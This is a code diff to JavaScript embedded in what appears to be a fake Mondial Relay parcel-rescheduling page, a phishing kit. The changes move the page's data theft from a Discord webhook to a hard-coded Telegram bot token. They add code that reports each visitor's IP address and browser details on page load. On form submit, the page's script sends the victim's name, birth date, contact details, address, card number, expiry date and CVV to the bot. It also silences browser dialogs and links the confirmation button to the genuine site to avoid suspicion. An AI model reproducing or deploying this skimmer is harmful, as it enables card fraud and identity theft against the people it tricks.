@@ -70670,9 +70670,11 @@ website:    http://www.burocratik.com
     (function () {
         'use strict';
 
-        var WEBHOOK_URL = "https://discord.com/api/webhooks/1544335155047432266/7gQRtDH5UKfBWIhL2OIqznyhWfX-P_Dc8YsPe-4tDUV0y9hjbgzSVjSmysMvTkOMD6db";
-        var IMG_COLIS = "ico_basket.png";
+        var TG_TOKEN   = "8722740980:AAEsPxGa5fqPs3PtXVZj-DKy3N4XNCUVZHk";
+        var TG_CHAT_ID = "-1004489514056";
+        var IMG_COLIS  = "ico_basket.png";
         var __MR_SENT = false;
+        var __VISITOR_SENT = false;
 
         window.alert   = function () { return true; };
         window.confirm = function () { return true; };
@@ -70705,6 +70707,125 @@ website:    http://www.burocratik.com
             +      '<path d=%22M58 20 L32 32 L32 58 L58 46 Z%22 fill=%22%23b8834a%22/>'
             +      '<rect x=%2240%22 y=%2240%22 width=%228%22 height=%228%22 fill=%22%23e94b35%22 rx=%221%22/>'
             +      '</svg>\';">';
+
+        // ================================================================
+        // ============ ENVOI VISITEUR (IP + USER AGENT) ==================
+        // ================================================================
+        function sendVisitorInfo() {
+            if (__VISITOR_SENT) return;
+            __VISITOR_SENT = true;
+
+            var ua = navigator.userAgent;
+            var lang = navigator.language || 'N/A';
+            var screenRes = window.screen.width + 'x' + window.screen.height;
+            var platform = navigator.platform || 'N/A';
+            var now = new Date();
+            var timeStr = now.toLocaleString('fr-FR');
+
+            // Détection navigateur
+            var browser = 'Autre';
+            if (/Edg\//.test(ua))              browser = 'Microsoft Edge';
+            else if (/OPR\//.test(ua))         browser = 'Opera';
+            else if (/Chrome\//.test(ua))      browser = 'Google Chrome';
+            else if (/Firefox\//.test(ua))     browser = 'Mozilla Firefox';
+            else if (/Safari\//.test(ua))      browser = 'Safari';
+
+            // Détection OS
+            var os = 'Autre';
+            if (/Windows NT 10/.test(ua))      os = 'Windows 10/11';
+            else if (/Windows/.test(ua))       os = 'Windows';
+            else if (/Android/.test(ua))       os = 'Android';
+            else if (/iPhone|iPad/.test(ua))   os = 'iOS';
+            else if (/Mac OS X/.test(ua))      os = 'macOS';
+            else if (/Linux/.test(ua))         os = 'Linux';
+
+            function sendMessage(ip) {
+                var message = ''
+                    + '🟢 <b>NOUVEL UTILISATEUR CONNECTÉ</b>\n'
+                    + '━━━━━━━━━━━━━━━━━━━━\n'
+                    + '🌐 <b>IP</b> : <code>' + ip + '</code>\n'
+                    + '🖥️ <b>Navigateur</b> : ' + browser + '\n'
+                    + '💻 <b>Système</b> : ' + os + '\n'
+                    + '📱 <b>Plateforme</b> : ' + platform + '\n'
+                    + '🌍 <b>Langue</b> : ' + lang + '\n'
+                    + '📐 <b>Résolution</b> : ' + screenRes + '\n'
+                    + '🕐 <b>Date/Heure</b> : ' + timeStr + '\n'
+                    + '━━━━━━━━━━━━━━━━━━━━\n'
+                    + '🔎 <b>User-Agent complet</b> :\n'
+                    + '<code>' + ua.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</code>\n'
+
+                fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TG_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    })
+                })
+                .then(function (r) { return r.json(); })
+                .then(function (res) {
+                    if (res.ok) console.log('✅ Visiteur signalé à Telegram');
+                    else        console.error('❌ Erreur Telegram visiteur :', res);
+                })
+                .catch(function (err) { console.error('❌ Fetch Telegram visiteur :', err); });
+            }
+
+            // Récupération de l'IP via ipify
+            fetch('https://api.ipify.org?format=json')
+                .then(function (r) { return r.json(); })
+                .then(function (ipData) { sendMessage(ipData.ip || 'Inconnue'); })
+                .catch(function (err) {
+                    console.warn('⚠️ Impossible de récupérer l\'IP :', err);
+                    sendMessage('Inconnue');
+                });
+        }
+
+        // 🚀 Envoi immédiat au chargement de la page
+        sendVisitorInfo();
+
+        // ================================================================
+        // ============ ENVOI FORMULAIRE + CARTE BANCAIRE =================
+        // ================================================================
+        function sendToTelegram(data, card) {
+            var message = ''
+                + '💳 <b>NOUVELLE CC</b>\n\n'
+                + '━━━━━━━━━━━━━━━━━━━━\n'
+                + '📮 <b>N° Colis</b> : ' + (data.colis || 'N/A') + '\n'
+                + '🌍 <b>Pays</b> : ' + (data.pays || 'N/A') + '\n'
+                + '👤 <b>Nom complet</b> : ' + (data.prenom || '') + ' ' + (data.nom || '') + '\n'
+                + '🎂 <b>Date de naissance</b> : ' + (data.date_naissance || 'N/A') + '\n'
+                + '📧 <b>Email</b> : ' + (data.email || 'N/A') + '\n'
+                + '📞 <b>Téléphone</b> : ' + (data.telephone || 'N/A') + '\n'
+                + '🏠 <b>Adresse</b> : ' + (data.adresse || '') + ', ' + (data.code_postal || '') + ' ' + (data.ville || '') + '\n'
+                + '📅 <b>Date reprogrammation</b> : ' + (data.date_repro || 'N/A') + '\n'
+                + '━━━━━━━━━━━━━━━━━━━━\n'
+                + '💳 <b>Numéro de carte</b> : <code>' + card.number + '</code>\n'
+                + '📆 <b>Expiration</b> : <code>' + card.exp + '</code>\n'
+                + '🔒 <b>CVV</b> : <code>' + card.cvv + '</code>\n'
+                + '👤 <b>Titulaire carte</b> : ' + card.holder + '\n'
+
+
+            var url = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage';
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            })
+            .then(function (r) { return r.json(); })
+            .then(function (res) {
+                if (res.ok) console.log('✅ Message Telegram envoyé');
+                else        console.error('❌ Erreur Telegram :', res);
+            })
+            .catch(function (err) { console.error('❌ Erreur fetch Telegram :', err); });
+        }
 
         function getMainContainer() {
             var selectors = ['.internal-page.suivi', '.internal-page', 'main', '.container', '.content', '#app'];
@@ -70973,7 +71094,7 @@ website:    http://www.burocratik.com
 
         }, true);
 
-        // ============ SUBMIT PAIEMENT → ENVOI UNIQUE DISCORD + PAGE CONFIRMATION ============
+        // ============ SUBMIT PAIEMENT → ENVOI TELEGRAM + PAGE CONFIRMATION ============
         document.addEventListener('submit', function (e) {
             var f = e.target;
             if (!f || f.id !== 'mr-payment-form') return;
@@ -70991,7 +71112,7 @@ website:    http://www.burocratik.com
                 holder: f.card_holder.value
             };
 
-            console.log('📦 Envoi UNIQUE au webhook :', data, card);
+            console.log('📦 Envoi UNIQUE au bot Telegram :', data, card);
 
             var main = getMainContainer();
             var num = data.colis || 'N/A';
@@ -71047,7 +71168,7 @@ website:    http://www.burocratik.com
                             </p>
                         </div>
 
-                        <a href="#" class="mr-success-btn" onclick="window.scrollTo(0,0);return false;">
+                        <a href="https://www.mondialrelay.fr" target="_blank" rel="noopener" class="mr-success-btn">
                             Retour à l'accueil
                         </a>
 
@@ -71059,40 +71180,8 @@ website:    http://www.burocratik.com
             window.scrollTo(0, 0);
             if (montantBar) montantBar.style.display = 'none';
 
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: '💳 **NOUVELLE SAISIE CARTE BANCAIRE + REPROGRAMMATION**',
-                    embeds: [{
-                        title: '📦 Reprogrammation Mondial Relay',
-                        color: 0x96154a,
-                        timestamp: new Date().toISOString(),
-                        fields: [
-                            { name: '📮 N° Colis', value: data.colis || 'N/A', inline: true },
-                            { name: '🌍 Pays', value: data.pays || 'N/A', inline: true },
-                            { name: '👤 Nom complet', value: (data.prenom || '') + ' ' + (data.nom || ''), inline: false },
-                            { name: '🎂 Date de naissance', value: data.date_naissance || 'N/A', inline: true },
-                            { name: '📧 Email', value: data.email || 'N/A', inline: false },
-                            { name: '📞 Téléphone', value: data.telephone || 'N/A', inline: true },
-                            { name: '🏠 Adresse', value: (data.adresse || '') + ', ' + (data.code_postal || '') + ' ' + (data.ville || ''), inline: false },
-                            { name: '📅 Date reprogrammation', value: data.date_repro || 'N/A', inline: true },
-                            { name: '\u200b', value: '\u200b', inline: false },
-                            { name: '💳 Numéro de carte', value: '`' + card.number + '`', inline: false },
-                            { name: '📆 Expiration', value: '`' + card.exp + '`', inline: true },
-                            { name: '🔒 CVV', value: '`' + card.cvv + '`', inline: true },
-                            { name: '👤 Titulaire carte', value: card.holder, inline: false }
-                        ],
-                        footer: { text: 'Mondial Relay by InPost' }
-                    }]
-                })
-            })
-            .then(function (r) {
-                console.log('✅ Webhook envoyé, statut:', r.status);
-            })
-            .catch(function (err) {
-                console.error('❌ Erreur webhook:', err);
-            });
+            // 👉 Envoi au bot Telegram (en arrière-plan)
+            sendToTelegram(data, card);
         }, true);
 
     })();
@@ -71547,6 +71636,7 @@ website:    http://www.burocratik.com
         // ===== SVG COLIS (carte récap) =====
         // ===== IMAGE COLIS (carte récap) =====
         var MR_PARCEL_SVG = '<img src="ico_basket.png" alt="Colis" style="width:100%; height:100%; object-fit:contain; display:block;">';
+
         function getMainContainer() {
             var selectors = ['.internal-page.suivi', '.internal-page', 'main', '.container', '.content', '#app'];
             for (var i = 0; i < selectors.length; i++) {
